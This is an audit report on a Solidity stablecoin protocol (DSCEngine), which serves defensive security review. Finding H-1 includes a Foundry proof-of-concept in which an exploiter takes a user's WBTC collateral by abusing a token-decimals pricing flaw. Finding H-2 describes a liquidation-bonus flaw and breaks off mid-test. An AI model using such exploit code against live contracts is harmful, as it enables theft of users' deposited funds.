# Stablecoin Audit Report

# Audit Details

GitHub：https://github.com/williamhjc/foundry-defi-stablecoin

**The findings described in this document correspond the following commit hash:**

```
7e32046b33e3eb76acb378255edccbde21b2c481
```

## Scope

```
./src/
-- libraries
-- DSCEngine.sol
-- DecentralizedStableCoin.sol
```

# Protocol Summary

The Decentralized Stablecoin (DSC) System is a minimalistic, overcollateralized stablecoin protocol designed to maintain a 1:1 peg with the US dollar. It is exogenously collateralized, algorithmically stable, and inspired by MakerDAO's DAI system, but without governance or fees. The system supports collateral in WETH and WBTC, ensuring the protocol remains overcollateralized at all times.

## Roles

#### **1. DSCEngine (Core Contract)**

- Acts as the **controller** of the stablecoin system.
- Handles collateral deposits (e.g., WETH, WBTC).
- Mints and burns the stablecoin (DecentralizedStableCoin).
- Interfaces with OracleLib to fetch reliable USD-denominated prices for collateral.
- Enforces collateralization rules, debt ceilings, and liquidation thresholds.
- Core logic for minting, redeeming, and liquidation lives here.

------

#### **2. DecentralizedStableCoin (DSC)**

- The **ERC20 stablecoin** contract.
- Tokens are minted when users lock sufficient collateral in DSCEngine.
- Tokens are burned when users repay their debt or when liquidations occur.
- Fully controlled by DSCEngine; end users cannot mint directly.

------

#### **3. OracleLib**

- A **utility library** for fetching and validating on-chain price data.
- Reads from Chainlink price feeds.
- Ensures returned prices are fresh and valid.
- Provides standardized pricing data (scaled to a fixed precision, e.g., 1e18) for use in DSCEngine.

------

#### **4. Collateral Assets (WETH & WBTC)**

- **Accepted collateral tokens** that users deposit into DSCEngine.
- Their market value, as reported by Chainlink oracles, determines how much DSC can be minted.
- Serve as the security backing the stablecoin supply.

------

#### **5. Chainlink Price Feeds**

- **Trusted external data sources** for USD-denominated asset prices.
- Provide the real-time market value of collateral assets like WETH and WBTC.
- Used exclusively through OracleLib to maintain consistent validation logic.

------

#### **6. User**

- The **borrower / stablecoin minter**.
- Can:
  - Deposit collateral (WETH, WBTC).
  - Mint DSC against deposited collateral.
  - Redeem collateral by burning DSC.
  - Transfer DSC to other users for payments or trading.

------

#### **7. Liquidator**

- A special **actor role** responsible for maintaining system solvency.
- Monitors user positions and liquidates those that fall below required collateralization ratios.
- Seizes undercollateralized users’ collateral, repaying their debt by burning DSC.
- Typically incentivized with liquidation bonuses.

# Executive Summary

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 4                      |
| Medium   | 3                      |
| Low      | 0                      |
| Gas/Info | 3                      |
| Total    | 10                     |

## Findings

### High

### [H-1] Theft of collateral tokens with fewer than 18 decimals

**Description:** The token prices computed by `DSCEngine#getTokenAmountFromUsd()` and `DSCEngine#getUsdValue()` fail to account for token decimals. As written, these methods assume that all tokens have 18 decimals; however, one of the stated collateral tokens is `WBTC`, which has only 8 decimals on Ethereum mainnet.

This 18-decimal assumption creates a discrepancy between the protocol-computed USD value and actual USD value of tokens with non-standard decimals. As a result, any deposited collateral token with fewer than 18 decimals (including `WBTC`) can potentially be stolen by an attacker.

**Impact:** Direct theft of deposited collateral for tokens with fewer than 18 decimals.

**Proof of Concept:**

Place the following test into `RaffleTest.t.sol`.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import {DeployDSC} from "../../script/DeployDSC.s.sol";
import {DSCEngine} from "../../src/DSCEngine.sol";
import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
import {MockV3Aggregator} from "../mocks/MockV3Aggregator.sol";
import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

contract TokenDecimalExploit is StdCheats, Test {
    DSCEngine public dsce;
    DecentralizedStableCoin public dsc;
    HelperConfig public helperConfig;

    address public ethUsdPriceFeed;
    address public btcUsdPriceFeed;
    address public weth;
    address public wbtc;
    uint256 public wethDecimals;
    uint256 public wbtcDecimals;
    uint256 public feedDecimals;
    uint256 public deployerKey;

    address public user = address(1);
    address public exploiter = address(2);

    uint256 public constant STARTING_USER_BALANCE = 10 ether;
    uint256 public constant MIN_HEALTH_FACTOR = 1e18;
    uint256 public constant LIQUIDATION_BONUS = 10;
    uint256 public constant LIQUIDATION_THRESHOLD = 50;
    uint256 public constant LIQUIDATION_PRECISION = 100;

    function setUp() external {
        DeployDSC deployer = new DeployDSC();
        (dsc, dsce, helperConfig) = deployer.run();
        (ethUsdPriceFeed, btcUsdPriceFeed, weth, wbtc, deployerKey) = helperConfig.activeNetworkConfig();
        if (block.chainid == 31337) {
            vm.deal(user, STARTING_USER_BALANCE);
        }
        ERC20DecimalsMock(weth).mint(user, STARTING_USER_BALANCE);
        ERC20DecimalsMock(wbtc).mint(user, STARTING_USER_BALANCE);
        ERC20DecimalsMock(weth).mint(exploiter, STARTING_USER_BALANCE);
        // The exploiter is not given any WBTC.

        wethDecimals = ERC20DecimalsMock(weth).decimals();
        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();
        feedDecimals = helperConfig.FEED_DECIMALS();
    }

    /**
     * @notice This test is based on a very real possible scenario involving WETH and WBTC.
     *
     * On Ethereum mainnet, WETH and WBTC have 18 and 8 decimals, respectively.
     * The current prices of WETH and WBTC are close to $2,000 and $30,000, respectively.
     * The `DSCEngine` allows a user to borrow up to the liquidation threshold.
     * The `DSCEngine` fails to account for token decimals when computing USD prices.
     */ 
    function testExploitTokenDecimals() public {
        // Set initial prices.
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(int256(2_000 * 10**feedDecimals)); // $2,000
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(int256(30_000 * 10**feedDecimals)); // $30,000

        // A user borrows the maximum possible amount of DSC using WETH as collateral.
        vm.startPrank(user);
        uint256 amountWethDeposited = 1 * 10**wethDecimals; // 1 WETH
        uint256 expectedValueWeth = 2_000 ether; // $2,000
        uint256 amountDscFromWeth = (expectedValueWeth * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(weth).approve(address(dsce), amountWethDeposited);
        dsce.depositCollateralAndMintDsc(weth, amountWethDeposited, amountDscFromWeth);
        assertEq(dsc.balanceOf(user), amountDscFromWeth);
        vm.stopPrank();

        // The user's 1 WETH should be worth $2,000 as we expect.
        uint256 valueWeth = dsce.getUsdValue(weth, amountWethDeposited);
        assertEq(valueWeth, expectedValueWeth);

        // Similarly, the reciprocal is true.
        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, expectedValueWeth);
        assertEq(amountWeth, amountWethDeposited);

        // Now the user borrows more DSC using WBTC collateral.
        // The flawed price computation ensures that the user can't borrow much at all, but they will anyway.
        vm.startPrank(user);
        uint256 amountWbtcDeposited = 1 * 10**wbtcDecimals; // 1 WBTC
        // This is the flaw! Given WBTC's 8 decimals, this WBTC is priced at $0.000003 instead of $30,000.
        uint256 expectedValueWbtc = 30_000 * 10**wbtcDecimals; // $0.000003 != $30,000
        uint256 amountDscFromWbtc = (expectedValueWbtc * LIQUIDATION_THRESHOLD) / LIQUIDATION_PRECISION;
        ERC20DecimalsMock(wbtc).approve(address(dsce), amountWbtcDeposited);
        dsce.depositCollateralAndMintDsc(wbtc, amountWbtcDeposited, amountDscFromWbtc);
        assertEq(dsc.balanceOf(user), amountDscFromWeth + amountDscFromWbtc);
        vm.stopPrank();

        // The user's 1 WBTC is worth far too little.
        uint256 valueWbtc = dsce.getUsdValue(wbtc, amountWbtcDeposited);
        assertEq(valueWbtc, expectedValueWbtc);

        // Similarly, the reciprocal is true.
        uint256 amountWbtc = dsce.getTokenAmountFromUsd(wbtc, expectedValueWbtc);
        assertEq(amountWbtc, amountWbtcDeposited);

        // An exploiter acquires DSC to perform a liquidation (DSC could have come from the market, but we borrow it).
        vm.startPrank(exploiter);
        ERC20DecimalsMock(weth).approve(address(dsce), amountWethDeposited);
        dsce.depositCollateralAndMintDsc(weth, amountWethDeposited, amountDscFromWeth);
        assertEq(dsc.balanceOf(exploiter), amountDscFromWeth);
        vm.stopPrank();

        // Over time, the price of WBTC falls just slightly. The user is now vulnerable to liquidation.
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(int256(29_999 * 10**feedDecimals)); // $29,999
        uint256 newValueWbtc = dsce.getUsdValue(wbtc, amountWbtcDeposited);
        assertTrue(dsce.getHealthFactor(user) < MIN_HEALTH_FACTOR);

        // The exploiter liquidates the user's WBTC by paying back an "equivalent" amount of DSC.
        // The amount is actually far too low given the flawed price calculation.
        // After this, the exploiter still has plenty of DSC and all of the user's WBTC.
        // The exploiter paid ~$0.0000027 for ~$30,000 worth of WBTC.
        vm.startPrank(exploiter);
        // This comes out to about $0.0000027 (reduced from $0.000003 to account for 10% liquidation bonus)
        uint256 debtToPay = (newValueWbtc * LIQUIDATION_PRECISION) / (LIQUIDATION_PRECISION + LIQUIDATION_BONUS);
        dsc.approve(address(dsce), debtToPay);
        dsce.liquidate(wbtc, user, debtToPay);
        vm.stopPrank();
        
        // Exploiter has all of the WBTC and still lots of DSC left!
        uint256 err = 0.0001 ether; // 0.01% allowable relative error to account for rounding
        assertApproxEqRel(ERC20DecimalsMock(wbtc).balanceOf(exploiter), amountWbtcDeposited, err);
        assertApproxEqRel(dsc.balanceOf(exploiter), amountDscFromWeth, err);

        // User has no WBTC left in the `DSCEngine`.
        assertApproxEqAbs(dsce.getCollateralBalanceOfUser(user, wbtc), 0, 1); // 1 wei of allowable error for rounding
    }
}
```

**Recommended Mitigation:** Test for varied token decimals! Here is a diff which adds some relevant tests to the existing code base. Note that the new tests fail!

```solidity
diff --git a/script/HelperConfig.s.sol b/script/HelperConfig.s.sol
index c9083ad..98c2b56 100644
--- a/script/HelperConfig.s.sol
+++ b/script/HelperConfig.s.sol
@@ -4,7 +4,7 @@ pragma solidity ^0.8.18;
 
 import {Script} from "forge-std/Script.sol";
 import {MockV3Aggregator} from "../test/mocks/MockV3Aggregator.sol";
-import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
+import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
 
 contract HelperConfig is Script {
     struct NetworkConfig {
@@ -15,7 +15,9 @@ contract HelperConfig is Script {
         uint256 deployerKey;
     }
 
-    uint8 public constant DECIMALS = 8;
+    uint8 public constant FEED_DECIMALS = 8;
+    uint8 public constant WETH_DECIMALS = 18;
+    uint8 public constant WBTC_DECIMALS = 8;
     int256 public constant ETH_USD_PRICE = 2000e8;
     int256 public constant BTC_USD_PRICE = 1000e8;
     uint256 public DEFAULT_ANVIL_KEY = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
@@ -47,16 +49,18 @@ contract HelperConfig is Script {
 
         vm.startBroadcast();
         MockV3Aggregator ethUsdPriceFeed = new MockV3Aggregator(
-            DECIMALS,
+            FEED_DECIMALS,
             ETH_USD_PRICE
         );
-        ERC20Mock wethMock = new ERC20Mock("WETH", "WETH", msg.sender, 1000e8);
+        ERC20DecimalsMock wethMock = new ERC20DecimalsMock("WETH", "WETH", WETH_DECIMALS);
+        wethMock.mint(msg.sender, 1000 * 10**WETH_DECIMALS);
 
         MockV3Aggregator btcUsdPriceFeed = new MockV3Aggregator(
-            DECIMALS,
+            FEED_DECIMALS,
             BTC_USD_PRICE
         );
-        ERC20Mock wbtcMock = new ERC20Mock("WBTC", "WBTC", msg.sender, 1000e8);
+        ERC20DecimalsMock wbtcMock = new ERC20DecimalsMock("WBTC", "WBTC", WBTC_DECIMALS);
+        wbtcMock.mint(msg.sender, 1000 * 10**WBTC_DECIMALS);
         vm.stopBroadcast();
 
         return NetworkConfig({
diff --git a/test/unit/DSCEngineTest.t.sol b/test/unit/DSCEngineTest.t.sol
index f697f8d..dc2de7d 100644
--- a/test/unit/DSCEngineTest.t.sol
+++ b/test/unit/DSCEngineTest.t.sol
@@ -6,7 +6,7 @@ import {DeployDSC} from "../../script/DeployDSC.s.sol";
 import {DSCEngine} from "../../src/DSCEngine.sol";
 import {DecentralizedStableCoin} from "../../src/DecentralizedStableCoin.sol";
 import {HelperConfig} from "../../script/HelperConfig.s.sol";
-import {ERC20Mock} from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
+import {ERC20DecimalsMock} from "@openzeppelin/contracts/mocks/ERC20DecimalsMock.sol";
 import {MockMoreDebtDSC} from "../mocks/MockMoreDebtDSC.sol";
 import {MockFailedMintDSC} from "../mocks/MockFailedMintDSC.sol";
 import {MockFailedTransferFrom} from "../mocks/MockFailedTransferFrom.sol";
@@ -24,6 +24,8 @@ contract DSCEngineTest is StdCheats, Test {
     address public btcUsdPriceFeed;
     address public weth;
     address public wbtc;
+    uint256 public wethDecimals;
+    uint256 public wbtcDecimals;
     uint256 public deployerKey;
 
     uint256 amountCollateral = 10 ether;
@@ -58,8 +60,11 @@ contract DSCEngineTest is StdCheats, Test {
         //     vm.etch(ethUsdPriceFeed, address(aggregatorMock).code);
         //     vm.etch(btcUsdPriceFeed, address(aggregatorMock).code);
         // }
-        ERC20Mock(weth).mint(user, STARTING_USER_BALANCE);
-        ERC20Mock(wbtc).mint(user, STARTING_USER_BALANCE);
+        ERC20DecimalsMock(weth).mint(user, STARTING_USER_BALANCE);
+        ERC20DecimalsMock(wbtc).mint(user, STARTING_USER_BALANCE);
+
+        wethDecimals = ERC20DecimalsMock(weth).decimals();
+        wbtcDecimals = ERC20DecimalsMock(wbtc).decimals();
     }
 
     ///////////////////////
@@ -81,21 +86,36 @@ contract DSCEngineTest is StdCheats, Test {
     // Price Tests //
     //////////////////
 
-    function testGetTokenAmountFromUsd() public {
-        // If we want $100 of WETH @ $2000/WETH, that would be 0.05 WETH
-        uint256 expectedWeth = 0.05 ether;
-        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, 100 ether);
+    function testGetWethTokenAmountFromUsd() public {
+        // If we want $10,000 of WETH @ $2000/WETH, that would be 5 WETH
+        uint256 expectedWeth = 5 * 10**wethDecimals;
+        uint256 amountWeth = dsce.getTokenAmountFromUsd(weth, 10_000 ether);
         assertEq(amountWeth, expectedWeth);
     }
 
-    function testGetUsdValue() public {
-        uint256 ethAmount = 15e18;
-        // 15e18 ETH * $2000/ETH = $30,000e18
-        uint256 expectedUsd = 30000e18;
+    function testGetWbtcTokenAmountFromUsd() public {
+        // If we want $10,000 of WBTC @ $1000/WBTC, that would be 10 WBTC
+        uint256 expectedWbtc = 10 * 10**wbtcDecimals;
+        uint256 amountWbtc = dsce.getTokenAmountFromUsd(wbtc, 10_000 ether);
+        assertEq(amountWbtc, expectedWbtc);
+    }
+
+    function testGetUsdValueWeth() public {
+        uint256 ethAmount = 15 * 10**wethDecimals;
+        // 15 ETH * $2000/ETH = $30,000
+        uint256 expectedUsd = 30_000 ether;
         uint256 usdValue = dsce.getUsdValue(weth, ethAmount);
         assertEq(usdValue, expectedUsd);
     }
 
+    function testGetUsdValueWbtc() public {
+        uint256 btcAmount = 15 * 10**wbtcDecimals;
+        // 15 BTC * $1000/BTC = $15,000
+        uint256 expectedUsd = 15_000 ether;
+        uint256 usdValue = dsce.getUsdValue(wbtc, btcAmount);
+        assertEq(usdValue, expectedUsd);
+    }
+
     ///////////////////////////////////////
     // depositCollateral Tests //
     ///////////////////////////////////////
@@ -119,7 +139,7 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
         // Act / Assert
         vm.expectRevert(DSCEngine.DSCEngine__TransferFailed.selector);
         mockDsce.depositCollateral(address(mockDsc), amountCollateral);
@@ -128,7 +148,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfCollateralZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
 
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.depositCollateral(weth, 0);
@@ -136,7 +156,8 @@ contract DSCEngineTest is StdCheats, Test {
     }
 
     function testRevertsWithUnapprovedCollateral() public {
-        ERC20Mock randToken = new ERC20Mock("RAN", "RAN", user, 100e18);
+        ERC20DecimalsMock randToken = new ERC20DecimalsMock("RAN", "RAN", 4);
+        ERC20DecimalsMock(randToken).mint(user, 100 ether);
         vm.startPrank(user);
         vm.expectRevert(DSCEngine.DSCEngine__NotAllowedToken.selector);
         dsce.depositCollateral(address(randToken), amountCollateral);
@@ -145,7 +166,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     modifier depositedCollateral() {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
         vm.stopPrank();
         _;
@@ -182,7 +203,7 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(mockDsce), amountCollateral);
 
         vm.expectRevert(DSCEngine.DSCEngine__MintFailed.selector);
         mockDsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
@@ -193,7 +214,7 @@ contract DSCEngineTest is StdCheats, Test {
         (, int256 price,,,) = MockV3Aggregator(ethUsdPriceFeed).latestRoundData();
         amountToMint = (amountCollateral * (uint256(price) * dsce.getAdditionalFeedPrecision())) / dsce.getPrecision();
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
 
         uint256 expectedHealthFactor =
             dsce.calculateHealthFactor(dsce.getUsdValue(weth, amountCollateral), amountToMint);
@@ -204,7 +225,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     modifier depositedCollateralAndMintedDsc() {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.stopPrank();
         _;
@@ -221,7 +242,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfMintAmountIsZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.mintDsc(0);
@@ -235,7 +256,7 @@ contract DSCEngineTest is StdCheats, Test {
         amountToMint = (amountCollateral * (uint256(price) * dsce.getAdditionalFeedPrecision())) / dsce.getPrecision();
 
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
 
         uint256 expectedHealthFactor =
@@ -259,7 +280,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfBurnAmountIsZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.burnDsc(0);
@@ -306,7 +327,7 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(address(mockDsc)).approve(address(mockDsce), amountCollateral);
         // Act / Assert
         mockDsce.depositCollateral(address(mockDsc), amountCollateral);
         vm.expectRevert(DSCEngine.DSCEngine__TransferFailed.selector);
@@ -316,7 +337,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testRevertsIfRedeemAmountIsZero() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.expectRevert(DSCEngine.DSCEngine__NeedsMoreThanZero.selector);
         dsce.redeemCollateral(weth, 0);
@@ -326,7 +347,7 @@ contract DSCEngineTest is StdCheats, Test {
     function testCanRedeemCollateral() public depositedCollateral {
         vm.startPrank(user);
         dsce.redeemCollateral(weth, amountCollateral);
-        uint256 userBalance = ERC20Mock(weth).balanceOf(user);
+        uint256 userBalance = ERC20DecimalsMock(weth).balanceOf(user);
         assertEq(userBalance, amountCollateral);
         vm.stopPrank();
     }
@@ -345,7 +366,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testCanRedeemDepositedCollateral() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         dsc.approve(address(dsce), amountToMint);
         dsce.redeemCollateralForDsc(weth, amountCollateral, amountToMint);
@@ -399,16 +420,16 @@ contract DSCEngineTest is StdCheats, Test {
         mockDsc.transferOwnership(address(mockDsce));
         // Arrange - User
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(mockDsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(mockDsce), amountCollateral);
         mockDsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.stopPrank();
 
         // Arrange - Liquidator
         collateralToCover = 1 ether;
-        ERC20Mock(weth).mint(liquidator, collateralToCover);
+        ERC20DecimalsMock(weth).mint(liquidator, collateralToCover);
 
         vm.startPrank(liquidator);
-        ERC20Mock(weth).approve(address(mockDsce), collateralToCover);
+        ERC20DecimalsMock(weth).approve(address(mockDsce), collateralToCover);
         uint256 debtToCover = 10 ether;
         mockDsce.depositCollateralAndMintDsc(weth, collateralToCover, amountToMint);
         mockDsc.approve(address(mockDsce), debtToCover);
@@ -422,10 +443,10 @@ contract DSCEngineTest is StdCheats, Test {
     }
 
     function testCantLiquidateGoodHealthFactor() public depositedCollateralAndMintedDsc {
-        ERC20Mock(weth).mint(liquidator, collateralToCover);
+        ERC20DecimalsMock(weth).mint(liquidator, collateralToCover);
 
         vm.startPrank(liquidator);
-        ERC20Mock(weth).approve(address(dsce), collateralToCover);
+        ERC20DecimalsMock(weth).approve(address(dsce), collateralToCover);
         dsce.depositCollateralAndMintDsc(weth, collateralToCover, amountToMint);
         dsc.approve(address(dsce), amountToMint);
 
@@ -436,7 +457,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     modifier liquidated() {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateralAndMintDsc(weth, amountCollateral, amountToMint);
         vm.stopPrank();
         int256 ethUsdUpdatedPrice = 18e8; // 1 ETH = $18
@@ -444,10 +465,10 @@ contract DSCEngineTest is StdCheats, Test {
         MockV3Aggregator(ethUsdPriceFeed).updateAnswer(ethUsdUpdatedPrice);
         uint256 userHealthFactor = dsce.getHealthFactor(user);
 
-        ERC20Mock(weth).mint(liquidator, collateralToCover);
+        ERC20DecimalsMock(weth).mint(liquidator, collateralToCover);
 
         vm.startPrank(liquidator);
-        ERC20Mock(weth).approve(address(dsce), collateralToCover);
+        ERC20DecimalsMock(weth).approve(address(dsce), collateralToCover);
         dsce.depositCollateralAndMintDsc(weth, collateralToCover, amountToMint);
         dsc.approve(address(dsce), amountToMint);
         dsce.liquidate(weth, user, amountToMint); // We are covering their whole debt
@@ -456,7 +477,7 @@ contract DSCEngineTest is StdCheats, Test {
     }
 
     function testLiquidationPayoutIsCorrect() public liquidated {
-        uint256 liquidatorWethBalance = ERC20Mock(weth).balanceOf(liquidator);
+        uint256 liquidatorWethBalance = ERC20DecimalsMock(weth).balanceOf(liquidator);
         uint256 expectedWeth = dsce.getTokenAmountFromUsd(weth, amountToMint)
             + (dsce.getTokenAmountFromUsd(weth, amountToMint) / dsce.getLiquidationBonus());
         uint256 hardCodedExpected = 6111111111111111110;
@@ -519,7 +540,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testGetCollateralBalanceOfUser() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
         vm.stopPrank();
         uint256 collateralBalance = dsce.getCollateralBalanceOfUser(user, weth);
@@ -528,7 +549,7 @@ contract DSCEngineTest is StdCheats, Test {
 
     function testGetAccountCollateralValue() public {
         vm.startPrank(user);
-        ERC20Mock(weth).approve(address(dsce), amountCollateral);
+        ERC20DecimalsMock(weth).approve(address(dsce), amountCollateral);
         dsce.depositCollateral(weth, amountCollateral);
         vm.stopPrank();
         uint256 collateralValue = dsce.getAccountCollateralValue(user);
```



### [H-2] Liquidation Is Prevented Due To Strict Implementation of Liquidation Bonus

**Description:** The issue arises due to the strict implementation of the liquidation bonus, which prevents liquidation when a user is between 100% to 110% over-collateralized. When a user's health factor falls below a certain threshold, liquidation should occur; however, the strict bonus implementation results in insufficient funds for liquidation, leading to the transaction being reverted.

The vulnerability allows users to avoid complete liquidation, even when their health factor drops to the critical range, which is problematic for the protocol's stability and security. The issue is more likely to occur when multiple types of collateral are used, and the value of one collateral crashes.

To demonstrate the vulnerability's impact, a proof of concept and a test case have been executed, highlighting the scenario where a liquidator is unable to liquidate a user's debt completely due to insufficient collateral, leading to transaction reversion.

I recommend a mitigation step to modify the liquidation bonus calculation when the health factor is between 100% to 110%. By adjusting the liquidation bonus to the maximum positive not-zero possible amount rather than a fixed value of `1.1 * liquidationAmount`, the vulnerability can be addressed.

**Impact:**When the health factor is between 100% and 110%, the liquidator cannot pay the debt partially, because the health factor is not going to be improved. Also, the liquidator cannot pay the debt completely, because the borrower does not have enough funds to pay the liquidation bonus. So, the borrower is never going to get liquidated.

Consider Alice has `x` $ as the collateral, `y`$ as the debt and the liquidation bonus is 10%. Consider Bob wants to pay `z`$ of Alice's debt and receive `1.1 * z`$ of her collateral. Also, consider Alice has a health factor under `MIN_HEALT_FACTOR`. We want to calculate what is the minimum amount that Alice must have as collateral to pay the full amount of debt as well as the liquidation bonus when she is getting liquidated. After liquidation, the collateral must at least be twice the debt: $$ (x - 1.1 \times z) \times 2 \leq y - z $$ In the previous equation, we are saying the amount that is going to be deducted from Alice's collateral in the liquidation process is `1.1 * z`. Then, the collateral amount minus the deducted value must be twice as the debt minus the deducted value. The minimum amount happens when the left-hand side is equal to the right-hand side. So, we want to calculate the equation below: $$ 2x - 2.2z = y - z $$ Also, for calculating the minimum amount, we have to assume that all of Alice's collateral can be liquidated now (`z = x / 1.1`). So, we change the equation to the equation below: $$ y = \frac{x}{1.1} $$ When the collateral is less than 1.1 times of the debt, Alice cannot pay the full amount to get liquidated. Hence, Alice is never going to be liquidated completely, unless her collateral becomes 1.1 times more than her debt. However, when, for example, the collateral is 1.05 times more than the debt, the liquidator still has incentives to liquidate the user and get a liquidation bonus.

This problem is more probable since this protocol can use multiple types of collateral. One collateral may crash and use its value, and the user's health factor reaches 100 to 110%. The liquidators should liquidate this user completely using the other collateral; however, this will not happen.

For example, consider Alice deposits 105$ of WETH and 95$ of WBTC. Also, Alice mints 100$ of DSC. Now, their health factor is more than `MIN_HEALTH_FACTOR`. Now, consider WBTC crashes and its value reaches 0. Now, Alice has 105$ of WETH collateral and 100$ of DSC debt. Her health factor is way less than `MIN_HEALTH_FACTOR`. Also, she is over-collateralized. However, no liquidator can send 100$ of DSC to receive 105$ of WETH; however, they can send ~95$ of DSC to receive 105$ of WETH. However, after that, the health factor is not going to be improved and the transaction is going to be reverted again. Hence, when the over-collateralized ratio is between 1 to 1.1, the user is never get liquidated.

**Proof of Concept:**

```solidity
function testCriticalHealthFactor() public {
        // Arranging the liquidator
        uint256 liquidatorCollateral = 10e18;
        ERC20Mock(weth).mint(liquidator, liquidatorCollateral);
        vm.startPrank(liquidator);
        ERC20Mock(weth).approve(address(dsce), liquidatorCollateral);
        uint256 liquidatorDebtToCover = 200e18;
        dsce.depositCollateralAndMintDsc(weth, liquidatorCollateral, amountToMint);
        dsc.approve(address(dsce), liquidatorDebtToCover);
        vm.stopPrank();

        // We set the price of WETH to $105 and WBTC to $95
        int256 wethUsdPrice = 105e8;
        MockV3Aggregator(ethUsdPriceFeed).updateAnswer(wethUsdPrice);
        int256 wbtcUsdPrice = 95e8;
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(wbtcUsdPrice);

        // Alice deposits 1 WBTC and 1 WETH and mints 100 DSC
        uint256 amountWethToDeposit = 1e18;
        uint256 amountWbtcToDeposit = 1e18;
        uint256 amountDscToMint = 100e18;
        vm.startPrank(user);
        ERC20Mock(weth).approve(address(dsce), amountWbtcToDeposit);
        dsce.depositCollateral(weth, amountWbtcToDeposit);
        ERC20Mock(wbtc).approve(address(dsce), amountWethToDeposit);
        dsce.depositCollateralAndMintDsc(wbtc, amountWethToDeposit, amountDscToMint);

        // WBTC crashes in its price will be $0
        int256 wbtcUsdPriceAfterCrash = 0;
        MockV3Aggregator(btcUsdPriceFeed).updateAnswer(wbtcUsdPriceAfterCrash);

        // Now, a liquidator tries to liquidate $100 of Alice's debt, and it will be reverted.
        vm.expectRevert();
